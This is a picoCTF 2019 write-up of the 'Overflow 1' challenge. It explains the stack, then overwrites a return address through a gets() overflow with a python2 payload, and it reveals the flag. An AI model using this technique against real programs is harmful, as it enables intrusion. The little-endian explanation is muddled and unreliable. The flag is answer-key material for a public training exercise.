# Overflow 1
150 points

### Description
*"You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260 on the shell server. Source."*

### Solution 
From here on out I'm going to start attempting each binary exploitation problem *without* peeking at the source code first. This is because in a real-world situation, such as in pentesting, you wouldn't normally have access to the source code of the program that you're trying to exploit.

So, what do we do instead? Well, we take the hints that the problem gives us into consideration, whether its the name or something in the description of the problem. You can also click the hints button in picoCTF to get another hint or two, and these are often links to pages about the type of exploit that should be used in the problem.

Other than hints, we just have to go by trial and error. So, we know from the name and the description that the problem involves a buffer overflow. Let's try a few inputs of different sizes.
```
$ ./vuln
Give me a string and lets see what happens: 
a
Woah, were jumping to 0x8048705 !
$ ./vuln
Give me a string and lets see what happens: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Woah, were jumping to 0x8048705 !
$ ./vuln
Give me a string and lets see what happens: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Woah, were jumping to 0x61616161 !
Segmentation fault (core dumped)
```

So it seems that we overflowed the buffer on the third try since the printed-out value changed and the program crashed. If you know your ASCII hex values, you may have also noticed that the value printed out, `0x61616161` is a 32-bit memory block of 4 a's, since `0x61` is the ASCII hex value for lowercase 'A'.

What's happening here? Well, first we need to talk about one of the most fundamental concepts in program execution and memory structure: the **stack**. If you already know how the stack works during program execution, then you can just <a href="#back_to_problem">skip</a> to the when I focus back on the problem.

#### The Stack
If you aren't familiar with the stack data structure, you can picture it as a literal stack of items, say books. You add, or **push**, books to the stack by placing them on the top and remove, or **pop**, books from the top as well. If you want to get the third book from the top, well you have to remove the top two first, one at a time.

You probably wouldn't act this way with a real stack of books, but it's still a good example. The stack is what's called a **first in, last out** data structure, meaning the first items that go into it are the last ones that come out. In other words, when we pop an item from the stack, we will get the last item that was pushed to the stack. 

In the context of memory usage, the stack is actually implemented "upside-down", meaning that it starts at the higher memory addresses and expands downwards. The implementation also isn't limited to only having immediate access to the item on the "top" of the stack. This is because the stack is implemented as a simple pointer that holds the current address of the top of the stack, so any items in the stack can still be accessed by their placement in the stack relation to the stack pointer.

The stack pointer is saved in a **processor register**. These are memory locations available directly on the CPU hardware, so they are the fastest form of memory, but also the smallest. They are often reserved for special variables like the stack pointer. We'll talk more about registers in future problems, but you can check out the [Wikipedia page](https://en.wikipedia.org/wiki/Processor_register) if you're interested in more information.

When a C program is executed, the instructions aren't read from the file as it executes. Instead, the instructions are loaded into memory in a section called the **text segment**. The process keeps track of which instruction comes next using the **instruction pointer**, which holds the address of the next instruction to be executed. It also has a register reserved for it like the stack pointer.

I'm going to illustrate what the C stack looks like during a function call using an example from [this](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html) buffer overflow tutorial. You should check out the rest this website if you're looking for some more cybersecurity learning resources.
```C
#include <stdio.h>

int MyFunc(int parameter1, char parameter2)
{
  int local1 = 9;
  char local2 = ‘Z’;
  return 0;
}
    
int main(int argc, char *argv[])
{
  MyFunc(7, ‘8’);
  return 0;
}
```

This code doesn't really do much, it just calls a function that initializes a couple of local variables and then the program exits. However, it's good for illustrating what's going on in the stack. Take a look at this.

![C_function_call_stack_layout.png](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/raw/C_function_call_stack_layout.png)

EBP is the **base pointer**, it usually starts out pointing to the same address as the stack pointer, which is ESP. As the stack grows, the stack pointer moves downward through the memory addresses, but the base pointer stays where it is. This is until a function is called. A function call signifies a change in **frame**, and the base pointer always points to the base of the current frame. Without going into too much detail, you can think of this as similar to a function's scope. The variables that are local to a function's scope, including parameters, are a part of that function call's associated frame in memory. 

So, we need to create a new frame when a function is called. This is done by first pushing the parameters to the stack in reverse order, and you can see in the image above that the parameters 7 and '8' are the first things on the stack, in reverse order. 

Remember this part, it's the most relevant part to this problem...

Next, the instruction pointer, also called **return address**, is pushed. This is the address of the next instruction to be executed *after* the function returns. Keep in mind that these are *assembly* instructions, so the next instruction may not necessarily be `return 0`. The function call will most likely be followed by some instructions that change back to the previous frame, i.e. restoring the previous base pointer and stack pointer.

**NOTE**: You can use the `-S` flag with the GNU Compiler to generate assembly instructions from C source code. Analyzing how source code is translated into assembly can really help you grasp some of these concepts.

After the return address address is pushed to the stack, the current base pointer is pushed so that the frame can be restored after the function returns. Remember that ESP moves throughout all of this, always pointing to the top of the stack.

Finally, the local parameters, 9 and 'Z', are pushed to the stack in the order that they are created.

<h4 id="back_to_problem">Back to the problem</h4>

I think it's time we finally look at the source code for this program, just so we can discuss things a little more clearly.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

We were correct in assuming that there is a buffer vulnerable to an overflow, since the C `gets` function does not check input size and is generally considered unsafe to use. However, we now see that there is a `flag` function which simply prints out `flag.txt` for us, but the function is never called in normal program execution. Remember though, the instructions will all be stored in the text segment, so the `flag` function will be stored somewhere in memory.

We also see that the 32-bit hex value being printed out is the return address. Now it makes sense why we were able to change it by overflowing the buffer. `buf` is a variable local to `vuln`, so when `vuln` is called, `buf` is pushed to the stack after the parameters (of which there are none in this case), the return address, and then the base pointer. Since we can overflow `buf` and write past the bounds of its memory, we can overwrite the base pointer, but more valuably the *return address*. This means that we can tell the program that the next instruction it should executed after `vuln` is the first instruction of `flag`. From there, the instruction pointer will just advance through the instructions of `flag`.

Something I should point out is that addresses are typically stored in memory in 4-byte chunks using the **little-endian** (for "little end") scheme. This means that if you're storing a value that is 4 bytes at a starting address of 0x11111111, the first byte would be stored in 0x11111114, the second in 0x11111113, and so on. This is because the 4-byte chunk is viewed as an entire value, rather than the individual bytes being treated this way. So, if a 4-character buffer took up addresses 0x11111111 through 0x11111114, and we overflowed it with a fifth character, that extra character would go in the next chunk at address 0x11111118.

The buffer is 64 characters, so we'll need at least 64 characters. Instead of trying to calculate the exact number of characters we'll need, we can figure it out pretty quickly using trial and error and python to print out different-sized strings of characters. Doing this, we find out that the 77th character is the first one to affect the return address, so that means we need to input 76 characters and then the address of flag.

We can figure out the address of `flag` by using `gdb`. Use the `x` command (for "examine") to see flag's address:
```
$ gdb ./vuln
(gdb) x flag
0x80485e6 <flag>:	0x53e58955
```

The value we are looking for is the one on the left. Note that it is only seven characters because there is a leading zero before the eight that isn't shown. We need to arrange it in little-endian fashion so that the bytes are loaded in the correct order. This means we need to reverse the bytes. Remember, every two characters are a byte in a hex value, so the rearrangement should look like this: `\xe6\x85\x04\x08`.

Now we can just use python to append this to the end of our string and pipe it to `vuln`. Remember from the handy-shellcode walkthrough that we should use Python2 to generate hex input values because it prints the actual bytes and not the hex values.
```python
$ python2 -c "print('a'*76 + '\xe6\x85\x04\x08')" | ./vuln
```
**Note:** You can also rearrange the address into 32-bit little-endian fashion by using the `p32` function from pwntools: `p32(0x080485e6)`.

This will get you the flag.

<details>
  <summary>Flag:</summary>
  picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}
</details>

[Next Problem]()

[Return to Binary Exploitation](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%230%20-%20Binary%20Exploitation%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
